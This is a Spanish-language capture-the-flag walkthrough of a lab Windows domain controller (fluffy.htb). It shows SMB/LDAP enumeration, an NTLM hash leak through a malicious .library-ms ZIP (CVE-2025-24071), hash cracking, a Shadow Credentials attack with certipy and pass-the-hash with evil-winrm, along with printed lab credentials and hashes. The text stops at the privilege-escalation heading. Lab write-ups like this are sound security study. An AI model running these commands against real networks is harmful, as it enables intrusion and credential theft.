***
- Tags: #ActiveDirectory #Kerberos #LDAP #SMB #RPC
***
Vamos a resolver la máquina Forest 
- Categoría: Fácil
- Sistema: Windows
- IP: `10.10.10.69`

### 1. Enumeración

> **Importante**: Nos han proporcionado credenciales iniciales: `j.fleischman / J0elTHEM4n1990!`

El escaneo inicial con nmap nos desvela la siguiente información:

```bash
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-15 04:04:05Z)
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2025-06-15T04:05:26+00:00; +7h00m01s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-15T04:05:26+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-15T04:05:26+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-15T04:05:26+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

- **Host:** `DC01.fluffy.htb`    
- **Dominio:** `fluffy.htb`    
- **Sistema:** Windows Server, muy probablemente un **Domain Controller**.    
- **Servicios clave levantados:**    
    - **Kerberos (88)**        
    - **LDAP/LDAPS (389, 636, 3268, 3269)**        
    - **SMB (445, 139)**        
    - **WinRM (5985)**        
    - **DNS (53)**        

> Típico entorno Active Directory. Aquí lo que buscas es **enumerar usuarios**, **recoger hashes o tickets**, y **moverte con herramientas específicas de AD**.

Lo primero que hacemos es añadir el dominio a nuestro `/etc/hosts` de la siguiente manera:

```
10.10.11.69 dc01.fluffy.htb fluffy.htb
```

Comenzamos por probar si se permite la enumeración RPC anónima:

```
❯ rpcclient -U "" 10.10.11.69
Password for [WORKGROUP\]:
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> enumdomains
result was NT_STATUS_ACCESS_DENIED
rpcclient $> enumprivs
found 35 privileges
```

Permite el acceso pero no la enumeración de usuarios, así que lo descartamos. La enumeración anónima con smbclient sí que está permitida:

```
❯ smbclient -L //10.10.11.69 -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	IT              Disk      
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.69 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Pero aunque nos deje conectarnos a los shares, no nos deja hacer nada más. Podemos también intentar consultas anónimas aprovechando que LDAP se encuentra abierto:

```bash
ldapsearch -x -H ldap://10.10.11.69 -s base
```

| Opción                  | Significado                                                             |
| ----------------------- | ----------------------------------------------------------------------- |
| `ldapsearch`            | Herramienta de línea de comandos para hacer consultas LDAP              |
| `-x`                    | Usa autenticación simple (**anónima**, sin SASL)                        |
| `-H ldap://10.10.11.69` | Conecta al host `10.10.11.69` por LDAP (puerto 389 sin cifrado TLS)     |
| `-s base`               | Define el **alcance** (scope) de búsqueda como **solo la entrada base** |

- **Dominio Active Directory:** `fluffy.htb`
- **Controlador de dominio:** `DC01.fluffy.htb`
- **Distinguished Name base para búsqueda:** `DC=fluffy,DC=htb`
- **Nivel funcional del dominio:** 7 (equivalente a Server 2016+)
- **Mecanismos SASL soportados:** GSSAPI, SPNEGO, DIGEST-MD5

Pues de forma anónima va a ser que no, pero para algo tenemos las credenciales:

![[Fluffy_1.png]]

Nos conectamos primero al share de IT:

```
❯ smbclient //10.10.11.69/IT -U 'j.fleischman'
Password for [WORKGROUP\j.fleischman]:
Try "help" to get a list of possible commands.
```

Y descargamos todo:

```
smb: \> prompt OFF
smb: \> recurse ON
smb: \> mget *
```

Lo primero es comprobar el PDF que viene. Trae esta información interesante:

![[Fluffy_2.png]]

| **CVE ID**     | **Descripción**                                                                                                         |
| -------------- | ----------------------------------------------------------------------------------------------------------------------- |
| CVE‑2025‑24996 | Vulnerabilidad en NTLM que permite a un atacante manipular rutas para provocar envío de hashes NTLM.                    |
| CVE‑2025‑24071 | Vulnerabilidad en Windows File Explorer que expone hashes NTLM al extraer archivos `.library-ms` maliciosos desde ZIPs. |
También se descargó una carpeta KeePass y otra de Everything. Se intentó buscar archivos de bases de datos `*.kdbx`, sin mucho éxito:

```
find . -iname '*.kdbx'
---
grep -ri '.kdbx' .
```

Aprovechando el share con permisos de lecutra SYSVOL nos metemos. Pero al revisar todo bien, encontramos poca cosa:

- Las políticas del sistema permiten contraseñas simples (mínimo 7 caracteres, sin complejidad).
- No hay límite de intentos fallidos, lo que facilita ataques de fuerza bruta.
- Se asignan derechos de logon interactivo a varios grupos, incluyendo un SID desconocido posiblemente relevante.

La clave está en el CVE‑2025‑24071, que tiene que ver con archivos zips. Dado que al conectarnos al share IT (con permisos de lectura/escritura) veíamos 3 archivos zip y sus correspondientes descomprimidos, tiene todo el sentido del mundo que la captura de hashes NTLM suceda con este vector. 

### 2. Explotación

 🔍 Exploit usado: EDB-ID **52310**

- **Fuente**: [Exploit-DB](https://www.exploit-db.com)    
- **URL directa**: https://www.exploit-db.com/exploits/52310    
- **Nombre del exploit**:  
    **"Microsoft Windows Explorer - NTLMv2 Hash Leak via .library-ms File"**

Se utilizó el exploit público [EDB-ID 52310](https://www.exploit-db.com/exploits/52310), el cual permite generar un archivo `.library-ms` malicioso que, al ser descomprimido por el sistema objetivo, fuerza la autenticación NTLM automática hacia un servidor SMB controlado por el atacante. Este comportamiento está relacionado con la vulnerabilidad **CVE-2025-24071**.

El exploit se localizó en Exploit-DB mediante búsqueda por términos clave: `"library-ms ntlm"` y el identificador de CVE. Se han seguido estos pasos:

![[Fluffy_3.png]]

Una vez generado el zip malicioso, montamos con `responder tun0` un servidor para escuchar movimientos. Subimos el archivo zip malicioso sabiendo que en el recurso `IT` se van a descomprimir ZIPs, y la captura del hash va a suceder al descomprimir dicho zip. Nos conectamos con `smbclient //10.10.11.69/IT -U 'j.fleischman'` al share y con `put umalware.zip` lo subimos. Esperamos a capturar el hash con responder:

![[Fluffy_4.png]]

Ahora que tenemos el hash, simplemente lo crackeamos con john o hashcat:

```
hashcat -m 5600 hash.hash /usr/share/wordlists/rockyou.txt
```

Tras un rato esperando, obtenemos los datos `p.agila/prometheusx-303`. Ahora nos toca tirar de Bloodhound. Lo primero es generar el archivo .zip con la información necesaria:

```bash
bloodhound-python -u 'p.agila' -p 'prometheusx-303'  -d fluffy.htb -ns 10.10.11.69 -c All --zip
```

Ahora, para evitar problemas de instalación que suele haber, montamos la imagen de Docker:

Paso 1: Descargar la imagen oficial:

```bash
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
```

Paso 2: Descomprimir y dar permisos de ejecución:

```bash
tar -xzf bloodhound-cli-linux-amd64.tar.gz
chmod +x bloodhound-cli
```

Paso 3: Instalar la imagen de docker y desplegar:

```bash
./bloodhound-cli install
...SNIP...
[+] BloodHound is ready to go!
[+] You can log in as `admin` with this password: 9VXtaWqNRb6Gv7w60XaFSO8cl65vRUyK
[+] You can get your admin password by running: bloodhound-cli config get default_password
[+] You can access the BloodHound UI at: http://127.0.0.1:8080/ui/login
```

Ahora vamos a esa ruta de localhost, importamos el zip y esperamos. Cuando finalice, ya tenemos listo la búsqueda con el gráfico:

![[Fluffy_5.png]]

- El usuario `p.agila` tiene **GenericAll** sobre el grupo SERVICE ACCOUNT MANAGERS@fluffy.htb. 

- Este grupo tiene como miembros:
- `p.agila`
- `j.coffey`

---

Durante esta fase, añadimos nuestra cuenta (`p.agila`) al grupo **`SERVICE ACCOUNTS`** del dominio, lo que nos otorgó permisos suficientes para abusar del ataque **Shadow Credentials** mediante Certipy. Específicamente, utilizamos `certipy-ad shadow auto` para **inyectar un certificado** malicioso en el atributo `msDS-KeyCredentialLink` de la cuenta objetivo `WINRM_SVC`. Esto nos permitió **suplantar su identidad mediante autenticación basada en certificados** (PKINIT), obteniendo un TGT válido sin necesidad de conocer su contraseña ni de crackear el hash Kerberos. Finalmente, una vez autenticados como `WINRM_SVC`, recuperamos su **hash NTLM completo**, lo que nos habilita para realizar ataques posteriores (como Pass-the-Hash, RDP, WinRM, o enumeración de privilegios adicionales). Tras completar el ataque, restauramos el atributo modificado para no dejar rastro evidente.

```bash
❯ net rpc group addmem "SERVICE ACCOUNTS@FLUFFY.HTB" "p.agila" -U 'p.agila%prometheusx-303' -S 10.10.11.69
❯ sudo certipy-ad shadow auto -username p.agila@fluffy.htb -p 'prometheusx-303' -account 'WINRM_SVC' -dc-ip 10.10.11.69
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'e3224c71-f855-eb9a-b0dc-25281a6bd125'
[*] Adding Key Credential with device ID 'e3224c71-f855-eb9a-b0dc-25281a6bd125' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID 'e3224c71-f855-eb9a-b0dc-25281a6bd125' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'winrm_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'winrm_svc.ccache'
[*] Wrote credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
```

> Aunque `WINRM_SVC` era vulnerable a Kerberoasting (tenía SPN), no logramos crackear su contraseña. Sin embargo, al tener privilegios sobre su atributo `msDS-KeyCredentialLink`, realizamos un ataque Shadow Credentials para **inyectar un certificado, obtener un TGT y finalmente exfiltrar su hash NTLM**. Este proceso es **independiente de Kerberoasting** y no requiere fuerza bruta.

Acontecemos ahora un Pass the Hash con evil-winrm:

```bash
vil-winrm -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767 -i 10.10.11.69
```

Y en el escritorio se encuentra la flag de usuario.

![[Fluffy_6.png]]

### 3. Escalada de privilegios

